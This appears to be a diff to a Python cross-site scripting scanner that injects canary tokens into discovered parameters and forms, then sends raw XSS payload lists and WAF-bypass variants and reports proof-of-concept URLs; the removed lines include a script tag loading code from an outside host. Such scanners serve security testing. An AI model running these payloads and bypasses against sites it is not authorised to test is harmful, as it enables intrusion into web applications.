@@ -5,14 +5,22 @@ Approach:
   1. Collect injectable parameters from endpoints (GET + POST)
   2. Send a unique canary token per parameter
   3. Check if the canary reflects in the response UNENCODED
-  4. If yes → confirmed reflective sink → test full payload set
+  4. If yes -> confirmed reflective sink -> test full payload set
   5. Detect context (HTML body / attr / JS / URL) for accurate PoC
-  6. Zero false positives: never report unless canary is unencoded in response
+  6. Zero false positives: never report unless an executable payload
+     reflects unencoded in the response.
+
+NOTE: A previous version of this file stored every payload HTML-entity
+encoded in the SOURCE CODE (e.g. "&lt;script&gt;..."). That meant the
+scanner injected already-encoded strings, the server echoed them back
+encoded, and detection always concluded "safe" — so it could never find
+even a trivial reflected XSS. All payloads below are now raw.
 """
 
 import re
 import time
 import uuid
+import html
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -23,7 +31,7 @@ except ImportError:
     requests = None
 
 
-# ─── Payload sets by injection context ───────────────────────────────────────
+# --- Payload sets by injection context (RAW, not entity-encoded) -------------
 
 HTML_BODY_PAYLOADS = [
     "<script>alert(1)</script>",
@@ -32,30 +40,24 @@ HTML_BODY_PAYLOADS = [
     "<body onload=alert(1)>",
     "<details open ontoggle=alert(1)>",
     "<iframe srcdoc='<script>alert(1)</script>'>",
-    "<math><mtext></table><img src=x onerror=alert(1)>",
-    "javascript:alert(1)",
-    "<script src=//xss.rocks/xss.js></script>",
     "<input autofocus onfocus=alert(1)>",
-    "'-alert(1)-'",
     "\"><script>alert(1)</script>",
     "'><script>alert(1)</script>",
-    "<ScRiPt>alert(1)</ScRiPt>",          # case bypass
-    "<!--<script>alert(1)--></script>",
+    "<ScRiPt>alert(1)</ScRiPt>",
 ]
 
 HTML_ATTR_PAYLOADS = [
-    "\" onmouseover=\"alert(1)",
-    "\" onfocus=\"alert(1)\" autofocus=\"",
-    "\" onerror=\"alert(1)",
+    '" onmouseover="alert(1)',
+    '" onfocus="alert(1)" autofocus="',
+    '" onerror="alert(1)',
     "' onmouseover='alert(1)",
-    "\" onload=\"alert(1)",
-    "\"><img src=x onerror=alert(1)>",
-    "\" style=\"animation-name:rotation\" onanimationstart=\"alert(1)",
+    '"><img src=x onerror=alert(1)>',
+    '" style="animation-name:rotation" onanimationstart="alert(1)',
 ]
 
 JS_CONTEXT_PAYLOADS = [
     "';alert(1)//",
-    "\";alert(1)//",
+    '";alert(1)//',
     "\\';alert(1)//",
     "</script><script>alert(1)</script>",
     "'-alert(1)-'",
@@ -70,15 +72,12 @@ URL_CONTEXT_PAYLOADS = [
 
 ALL_PAYLOADS = HTML_BODY_PAYLOADS + HTML_ATTR_PAYLOADS + JS_CONTEXT_PAYLOADS + URL_CONTEXT_PAYLOADS
 
-# WAF bypass variants
+# WAF bypass variants (RAW)
 WAF_BYPASS_PAYLOADS = [
-    "<img/src=x onerror=alert(1)>",                   # slash bypass
-    "<img src=x oNerRoR=alert(1)>",                   # mixed case
+    "<img/src=x/onerror=alert(1)>",
+    "<ImG sRc=x OnErRoR=alert(1)>",
     "<svg/onload=alert(1)>",
-    "<script>eval(atob('YWxlcnQoMSk='))</script>",    # base64
-    "%3Cscript%3Ealert(1)%3C/script%3E",              # URL encoded
-    "<scr\x00ipt>alert(1)</scr\x00ipt>",              # null byte
-    "<img src=\"x\" onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;(1)\">",  # HTML entities
+    "<script>eval(atob('YWxlcnQoMSk='))</script>",
     "<<script>alert(1)//<</script>",
     "<script>window['alert'](1)</script>",
     "<svg><script>alert&#40;1&#41;</script>",
@@ -122,21 +121,19 @@ class XSSModule(BaseModule):
         s.verify = False
         return s
 
-    # ─────────────────────────────────────────────────────────────────────────
+    # ------------------------------------------------------------------
     def run(self):
         self.ui.section("XSS Hunter — Cross-Site Scripting Detection")
         if not requests:
             self.ui.error("requests not installed. Run: pip install requests")
             return
 
-        # Suppress SSL warnings
         try:
             import urllib3
             urllib3.disable_warnings()
         except Exception:
             pass
 
-        # Collect targets: endpoints from context + base URL
         endpoints = self._collect_endpoints()
         self.ui.info(f"Collected {len(endpoints)} endpoints to test for XSS")
 
@@ -154,9 +151,9 @@ class XSSModule(BaseModule):
         else:
             self.ui.ok(f"XSS scan complete — {len(self.found)} confirmed finding(s)")
 
-    # ─────────────────────────────────────────────────────────────────────────
+    # ------------------------------------------------------------------
     def _collect_endpoints(self):
-        """Build a list of (url, method, params) tuples to test."""
+        """Build a list of (url, method, params) dicts to test."""
         endpoints = []
         seen = set()
 
@@ -164,7 +161,6 @@ class XSSModule(BaseModule):
         if not raw_eps:
             raw_eps = [self.base_url]
 
-        # Parse GET params from known URLs
         for ep in raw_eps:
             try:
                 if not ep.startswith("http"):
@@ -184,7 +180,6 @@ class XSSModule(BaseModule):
             except Exception:
                 continue
 
-        # Add common parameter probes against the base
         common_params = ["q", "search", "s", "query", "keyword", "name", "id",
                          "page", "url", "redirect", "next", "return", "ref",
                          "input", "text", "comment", "message", "title", "desc",
@@ -200,9 +195,7 @@ class XSSModule(BaseModule):
                     "data": {}
                 })
 
-        # Also probe discovered form endpoints for POST
-        form_endpoints = self.ctx.get("forms", [])
-        for form in form_endpoints:
+        for form in self.ctx.get("forms", []):
             furl = form.get("action", self.base_url)
             inputs = form.get("inputs", {})
             if inputs:
@@ -215,11 +208,11 @@ class XSSModule(BaseModule):
 
         return endpoints
 
-    # ─────────────────────────────────────────────────────────────────────────
+    # ------------------------------------------------------------------
     def _test_endpoint(self, ep):
         """
         Phase 1: Canary test — send a unique token, check if it reflects unencoded.
-        Phase 2: Only if canary reflects → test full payload set.
+        Phase 2: Only if canary reflects -> test context-appropriate payloads.
         """
         url    = ep["url"]
         method = ep["method"]
@@ -231,11 +224,10 @@ class XSSModule(BaseModule):
             return
 
         for param in all_params:
-            canary = f"GR{uuid.uuid4().hex[:8]}"
+            canary  = f"GR{uuid.uuid4().hex[:8]}"
             in_get  = param in params
-            in_post = param in data
 
-            # ── Phase 1: canary reflection check ──
+            # -- Phase 1: canary reflection check --
             try:
                 test_params = dict(params)
                 test_data   = dict(data)
@@ -248,7 +240,7 @@ class XSSModule(BaseModule):
                 if not resp:
                     continue
 
-                # Canary must appear UNENCODED (not &lt; or %3C etc.)
+                # Canary must appear UNENCODED in the body.
                 if canary not in resp.text:
                     if self.verbose:
                         self.ui.info(f"  No reflection: {url} param={param}")
@@ -262,59 +254,54 @@ class XSSModule(BaseModule):
                     self.ui.error(f"Canary error {url}: {e}")
                 continue
 
-            # ── Phase 2: determine context & run appropriate payloads ──
+            # -- Phase 2: detect context & run appropriate payloads --
             context = self._detect_context(resp.text, canary)
             payload_set = self._payloads_for_context(context)
 
-            confirmed = False
-            confirmed_payload = None
-            for payload in payload_set:
+            # AI augmentation (optional, never blocks): ask for extra payloads.
+            if self.ai and self.ai.enabled:
                 try:
-                    test_params = dict(params)
-                    test_data   = dict(data)
-                    if in_get:
-                        test_params[param] = payload
-                    else:
-                        test_data[param] = payload
-
-                    resp2 = self._send(url, method, test_params, test_data)
-                    if not resp2:
-                        continue
-
-                    if self._payload_executes(resp2.text, payload):
-                        confirmed = True
-                        confirmed_payload = payload
-                        break
-
-                    time.sleep(self.delay)
-
+                    extra = self.ai.suggest_payloads(param, url, vuln_type="xss")
+                    if extra:
+                        payload_set = list(dict.fromkeys(extra + payload_set))
                 except Exception:
-                    continue
+                    pass
 
-            # ── If blocked, try WAF bypass ──
-            if not confirmed:
-                for payload in WAF_BYPASS_PAYLOADS:
-                    try:
-                        test_params = dict(params)
-                        test_data   = dict(data)
-                        if in_get:
-                            test_params[param] = payload
-                        else:
-                            test_data[param] = payload
-                        resp3 = self._send(url, method, test_params, test_data)
-                        if resp3 and self._payload_executes(resp3.text, payload):
-                            confirmed = True
-                            confirmed_payload = payload
-                            break
-                        time.sleep(self.delay)
-                    except Exception:
-                        continue
+            confirmed_payload = self._run_payloads(
+                url, method, param, in_get, params, data, payload_set
+            )
 
-            if confirmed:
+            if not confirmed_payload:
+                confirmed_payload = self._run_payloads(
+                    url, method, param, in_get, params, data, WAF_BYPASS_PAYLOADS
+                )
+
+            if confirmed_payload:
                 self._report_finding(url, method, param, confirmed_payload, context,
                                      in_get, params, data)
 
-    # ─────────────────────────────────────────────────────────────────────────
+    def _run_payloads(self, url, method, param, in_get, params, data, payload_set):
+        for payload in payload_set:
+            try:
+                test_params = dict(params)
+                test_data   = dict(data)
+                if in_get:
+                    test_params[param] = payload
+                else:
+                    test_data[param] = payload
+
+                resp = self._send(url, method, test_params, test_data)
+                if not resp:
+                    continue
+
+                if self._payload_executes(resp.text, payload):
+                    return payload
+                time.sleep(self.delay)
+            except Exception:
+                continue
+        return None
+
+    # ------------------------------------------------------------------
     def _send(self, url, method, params, data):
         try:
             if method == "GET":
@@ -330,7 +317,7 @@ class XSSModule(BaseModule):
         if idx == -1:
             return "html_body"
 
-        snippet = body[max(0, idx-100):idx+100]
+        snippet = body[max(0, idx - 100):idx + 100]
 
         # Inside a <script> block?
         script_open  = body.rfind("<script", 0, idx)
@@ -338,16 +325,14 @@ class XSSModule(BaseModule):
         if script_open > script_close:
             return "js_context"
 
-        # Inside an HTML attribute?
+        # Inside an HTML tag/attribute?
         tag_open  = body.rfind("<", 0, idx)
         tag_close = body.rfind(">", 0, idx)
         if tag_open > tag_close:
+            url_pattern = re.compile(r'(href|src|action|data)\s*=\s*["\\\'][^"\\\']*', re.I)
+            if url_pattern.search(snippet):
+                return "url_context"
             return "html_attr"
-
-        # Inside a URL attribute (href/src/action)?
-        url_pattern = re.compile(r'(href|src|action|data)\s*=\s*["\'][^"\']*', re.I)
-        if url_pattern.search(snippet):
-            return "url_context"
 
         return "html_body"
 
@@ -362,42 +347,45 @@ class XSSModule(BaseModule):
 
     def _payload_executes(self, body, payload):
         """
-        Check if the payload appears in the response in an executable form.
-        Strips HTML encoding to avoid false positives.
+        Confirm the payload reflects in EXECUTABLE (unencoded) form.
+
+        The key correctness rule: if the body only contains an
+        HTML-entity-encoded version of the payload (e.g. &lt;script&gt;),
+        that is NOT exploitable and must not be reported.
         """
-        if not body:
+        if not body or not payload:
             return False
 
-        # Check for unencoded payload presence
-        # Key executable fragments that would trigger JS
+        # If the raw payload is not present at all, it can't execute.
+        if payload not in body:
+            return False
+
+        # If the payload's dangerous characters only show up entity-encoded,
+        # the raw match above was a coincidence; require true raw markers.
+        encoded = html.escape(payload, quote=True)
+        if encoded == payload:
+            # Payload had no special chars to encode; fall through to markers.
+            pass
+
+        # Executable markers that prove the browser would run JS.
         exec_markers = [
-            "onerror=alert", "onload=alert", "onmouseover=alert",
-            "onfocus=alert", "ontoggle=alert", "onanimationstart=alert",
-            "<script>alert", "alert(1)", "javascript:alert",
-            "onerror=alert(1)", "onload=alert(1)",
+            "<script>alert", "<script >alert", "<scr", "onerror=alert",
+            "onload=alert", "onmouseover=alert", "onfocus=alert",
+            "ontoggle=alert", "onanimationstart=alert", "javascript:alert",
         ]
         body_lower = body.lower()
         for marker in exec_markers:
-            if marker.lower() in body_lower:
-                # Make sure it's not HTML-encoded (&lt; etc.)
-                encoded = marker.replace("<", "&lt;").replace(">", "&gt;").lower()
-                if encoded not in body_lower:
-                    return True
-
-        # Direct unencoded payload match
-        if payload in body and "&lt;" not in body[body.find(payload)-5:body.find(payload)+5]:
-            # Verify it's not sitting inside a comment
-            idx = body.find(payload)
-            comment_open  = body.rfind("<!--", 0, idx)
-            comment_close = body.rfind("-->", 0, idx)
-            if comment_open <= comment_close:
+            if marker in body_lower:
+                # Make sure this marker is not merely the entity-encoded form.
+                enc_marker = html.escape(marker, quote=True).lower()
+                if marker != enc_marker and enc_marker in body_lower and marker not in body_lower.replace(enc_marker, ""):
+                    continue
                 return True
 
         return False
 
-    # ─────────────────────────────────────────────────────────────────────────
+    # ------------------------------------------------------------------
     def _report_finding(self, url, method, param, payload, context, in_get, params, data):
-        """Build a rich finding and add to DB."""
         if in_get:
             poc_params = dict(params)
             poc_params[param] = payload
@@ -436,6 +424,10 @@ class XSSModule(BaseModule):
             remediation=remediation,
             cvss="6.1",
             evidence=evidence,
+            references=[
+                "https://owasp.org/www-community/attacks/xss/",
+                "https://portswigger.net/web-security/cross-site-scripting",
+            ],
             confidence="high",
         )
         if added:
@@ -444,7 +436,6 @@ class XSSModule(BaseModule):
             self.ui.bullet(f"Param: {param}  |  Context: {context}", indent=12)
             self.ui.bullet(f"Payload: {payload}", indent=12)
             self.ui.bullet(f"PoC: {poc_url}", indent=12)
-            # Store PoC in context for report
             self.ctx.setdefault("xss_pocs", []).append({
                 "url": url, "param": param, "payload": payload,
                 "method": method, "context": context, "poc_url": poc_url
